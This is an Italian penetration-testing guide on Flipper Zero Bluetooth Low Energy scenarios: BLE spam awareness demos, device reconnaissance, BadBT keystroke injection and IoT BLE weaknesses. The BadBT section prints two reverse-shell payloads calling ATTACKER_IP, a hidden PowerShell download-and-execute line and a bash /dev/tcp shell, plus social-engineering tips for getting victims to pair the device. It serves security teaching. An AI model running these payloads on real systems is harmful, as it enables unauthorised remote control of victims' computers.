## Scenari di Penetration Testing

### Scenario 1: BLE Spam per Disruption e Awareness

**Contesto:** Demo di security awareness per management o dipendenti. Obiettivo: dimostrare che il BLE non è "sicuro per default" e che popup non richiesti possono apparire su qualsiasi smartphone.

**Procedura:**

1. **Preparazione:** Informare il responsabile/CISO dell'azienda. Ottenere autorizzazione scritta
2. **Posizionamento:** Collocare il Flipper in una posizione centrale (es. centro tavolo meeting room)
3. **Avvio:** Attivare BLE Spam in modalità "All" o selezionare un vendor specifico
4. **Osservazione:** Attendere 15-30 secondi - i popup iniziano ad apparire sugli smartphone dei presenti
5. **Demo:** Mostrare come i popup appaiono, spiegare il meccanismo tecnico
6. **Mitigazione:** Mostrare come disabilitare i popup per ogni OS (iOS, Android, Windows)
7. **Documentazione:** Screenshot dei popup per il report

**Obiettivo didattico:**

- Il Bluetooth non è invisibile o sicuro solo perchè "non trasferisce dati"
- Gli advertising packets possono essere forgiati da chiunque
- Le notifiche di proximity pairing sono un vettore di social engineering
- Le mitigazioni esistono e sono semplici da applicare

**Rischi operativi:**

- In ambienti sensibili (ospedali, aeroporti), i popup possono generare panico
- Alcuni utenti potrebbero cliccare "Connetti" per errore
- Il BLE Spam può interferire con dispositivi BLE legittimi nelle vicinanze
- In ambienti corporate con MDM, il Bluetooth potrebbe essere gestito centralmente

### Scenario 2: BLE Scanning per OSINT e Reconnaissance

**Contesto:** Mappatura dell'ambiente wireless di un target durante un physical pentest. Obiettivo: identificare dispositivi BLE attivi, wearable dei dipendenti, serrature smart, tracker, dispositivi IoT.

**Procedura:**

1. **Passeggiata nell'area target** con il Flipper in modalità scanner BLE
2. **Registrazione** di tutti i dispositivi trovati: MAC, nome, RSSI, servizi
3. **Analisi** dei nomi dispositivo per identificare tipologia (es. "Fitbit Charge 5" = wearable di un dipendente)
4. **Mappatura** degli RSSI per stimare la posizione dei dispositivi fissi (serrature, beacon)
5. **Identificazione** di dispositivi IoT potenzialmente vulnerabili

**Cosa cercare:**

| Dispositivo | Indicatore | Rilevanza |
|---|---|---|
| Serrature smart | Nome "August", "Yale", "Nuki", servizio 0xFE24 | Alta - possibile accesso fisico |
| Tracker | Nome "AirTag", "Tile", "SmartTag" | Media - OSINT su movimenti |
| Wearable | Nome "Fitbit", "Garmin", "Apple Watch" | Media - OSINT su dipendenti |
| Beacon | Servizio 0xFEAA (Eddystone), 0x180F | Media - mappatura infrastruttura |
| Smart building | Nome "Philips Hue", "LIFX", termostat | Media - superficie IoT |
| Medical | Nome con "CGM", "Pump", prefissi medici | Alta - dispositivi medici (non toccare!) |
| Stampanti BLE | Nome con "HP", "Brother", "Canon" | Bassa - info su infrastruttura |

**Analisi dei MAC address:**

I primi 3 byte del MAC address (OUI - Organizationally Unique Identifier) identificano il vendor:

- `38:C9:86:xx:xx:xx` - Samsung
- `DC:A6:32:xx:xx:xx` - Raspberry Pi
- `E8:AB:FA:xx:xx:xx` - Shenzhen Bilian Electronic
- `A4:C1:38:xx:xx:xx` - Apple

**NOTA:** La maggior parte dei dispositivi BLE moderni usa MAC address randomizzati (Random Private Address), rendendo l'OUI lookup inefficace. Tuttavia, molti dispositivi IoT economici e legacy usano ancora MAC pubblici.

> **Nota personale:** Durante un assessment di un edificio corporate, ho trovato 47 dispositivi BLE attivi in un singolo piano. Di questi, 12 erano serrature smart (August e Nuki), 8 erano beacon per indoor positioning, 15 erano wearable di dipendenti (Fitbit, Apple Watch, Garmin), e il resto era un mix di smartphone e dispositivi IoT vari. Le serrature smart erano il finding più rilevante - la loro sola presenza nell'advertising BLE rivela la loro posizione esatta e il modello, informazioni utili per un attaccante fisico.

### Scenario 3: BadBT per Payload Wireless

**Contesto:** Esecuzione di payload HID su un target senza accesso fisico diretto, sfruttando il BLE HID del Flipper come tastiera wireless.

**Pre-requisiti:**

- Il Flipper deve essere paired con il target (questo è il vincolo principale)
- Il target deve avere Bluetooth attivo
- Il target deve essere sbloccato (o il payload deve gestire il lock screen)

**Procedura dettagliata:**

**Fase 1: Pairing**

Il pairing è la fase critica. Opzioni:

a) **Social engineering** - Chiedere all'utente di connettere "una tastiera Bluetooth per la demo"
b) **Accesso pregresso** - Pairing durante una sessione di lavoro precedente
c) **Dispositivo non presidiato** - Il target è sbloccato e non presidiato (violazione policy)
d) **Auto-accept** - Alcuni dispositivi/OS accettano HID senza conferma esplicita (raro ma possibile)

**Fase 2: Payload preparation**

Creare lo script DuckyScript per il payload desiderato. Esempio per reverse shell su Windows:

```
REM BadBT - Reverse Shell Windows
REM Autore: [redacted]
REM Target: Windows 10/11 con PowerShell
DELAY 3000
GUI r
DELAY 500
STRING powershell -w hidden -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/payload.ps1')"
ENTER
DELAY 1000
```

Esempio per macOS:

```
REM BadBT - Reverse Shell macOS
DELAY 3000
GUI SPACE
DELAY 500
STRING Terminal
ENTER
DELAY 1000
STRING bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
ENTER
```

**Fase 3: Esecuzione**

1. Caricare lo script sul Flipper
2. Avviare BadBT
3. Attendere la connessione (automatica se bonded)
4. Lo script si esegue automaticamente
5. Il payload viene digitato come se fosse un utente alla tastiera

**Considerazioni operative:**

- La velocità di digitazione BLE è più lenta del USB - script lunghi richiedono più tempo
- Il target potrebbe vedere la finestra del prompt/terminale aprirsi
- In ambienti con EDR/antivirus, il payload potrebbe essere bloccato
- Il BLE HID viene registrato nei log Bluetooth del target
- Il nome del dispositivo Flipper appare nella lista Bluetooth del target

> **Nota personale:** Il BadBT è sottovalutato come vettore di attacco. In un engagement, l'ho usato combinato con social engineering: durante un workshop sulla sicurezza, ho chiesto ai partecipanti di connettere il "presentatore Bluetooth" (il Flipper). Pairing fatto da 8 persone. Nei giorni successivi, ho potuto eseguire script su 5 di quei laptop dalla stanza meeting adiacente (il bonding era persistente e la riconnessione automatica). Naturalmente, il payload era benigno (apriva Notepad e scriveva "You've been hacked - Security Awareness Training"), ma ha dimostrato il rischio in modo molto concreto.

### Scenario 4: Analisi Sicurezza Dispositivi IoT BLE

**Contesto:** Assessment della sicurezza di dispositivi IoT che utilizzano BLE per la comunicazione. Target tipici: serrature smart, tracker, wearable, sensori IoT.

**Superficie di attacco BLE di un dispositivo IoT:**

```
+------------------+
| Advertising      | <-- Cosa espone? Nome, servizi, MAC
+------------------+
        |
+------------------+
| Pairing/Bonding  | <-- Come autentica? Just Works? Passkey? OOB?
+------------------+
        |
+------------------+
| GATT Services    | <-- Quali servizi espone? Sono protetti?
+------------------+
        |
+------------------+
| Data in Transit  | <-- I dati sono crittografati? Integrità?
+------------------+
        |
+------------------+
| Firmware Update  | <-- OTA update sicuro? Signed? Verificato?
+------------------+
```

**Cosa il Flipper può fare:**

- Scansionare e identificare il dispositivo
- Leggere servizi GATT esposti (se non protetti)
- Tentare il pairing con diverse modalità
- Inviare advertising per testare la reazione del dispositivo
- Emulare il dispositivo (in alcuni casi)

**Cosa il Flipper NON può fare (serve altro hardware):**

- Sniffing completo del traffico BLE (serve Ubertooth o nRF52840)
- MITM su connessioni esistenti (serve setup dedicato)
- Cracking di pairing key in tempo reale (serve potenza di calcolo)
- Fuzzing GATT avanzato (serve framework dedicato tipo BLEzzer o GATTacker)
- Analisi del firmware del dispositivo target

**Vulnerabilità comuni nei dispositivi IoT BLE:**

| Vulnerabilità | Descrizione | Impatto |
|---|---|---|
| Just Works pairing | Nessuna autenticazione nel pairing | Chiunque può connettersi |
| GATT non protetto | Characteristic leggibili/scrivibili senza auth | Lettura/modifica dati |
| Dati in chiaro | Comunicazione non crittografata dopo connessione | Sniffing dati |
| MAC fisso | Indirizzo MAC non randomizzato | Tracking del dispositivo |
| Nome dispositivo rivelatore | "NukiLock_ABC123" nell'advertising | OSINT, identificazione |
| OTA non firmato | Firmware update senza firma digitale | Firmware malevolo |
| Replay vulnerabile | Comandi BLE riproducibili | Replay apertura serratura |
| No rate limiting | Nessun limite a tentativi di autenticazione | Brute force PIN |

---

## Cross-Reference - Scenari Multi-Vettore

| Scenario | Modulo Correlato | Link | Come si collegano |
|----------|-----------------|------|-------------------|
| BLE spam + BadUSB | USB/Bad USB | [05-Scenari-Reali](../USB/Bad%20USB/05-Scenari-Reali.md) | BLE spam come distrazione → BadUSB drop mentre l'attenzione è altrove |
| BLE device + WiFi | WiFi-Marauder | [05-Scenari-Reali](../WiFi-Marauder/05-Scenari-Reali.md) | Identifica dispositivi BLE IoT → scan WiFi per trovare il loro gateway |
| BLE lock + NFC | NFC | [05-Scenari-Reali](../NFC/05-Scenari-Reali.md) | Serrature smart: BLE per apertura remota + NFC come backup fisico |
| BLE + Sub-GHz | Sub-GHz | [05-Scenari-Reali](../Sub-GHz/05-Scenari-Reali.md) | Domotica: dispositivi BLE + sensori Sub-GHz nello stesso ecosistema |
| BLE tracking + RFID | RFID | [05-Scenari-Reali](../RFID/05-Scenari-Reali.md) | Analisi BLE wearable dei dipendenti + clone badge RFID per accesso |

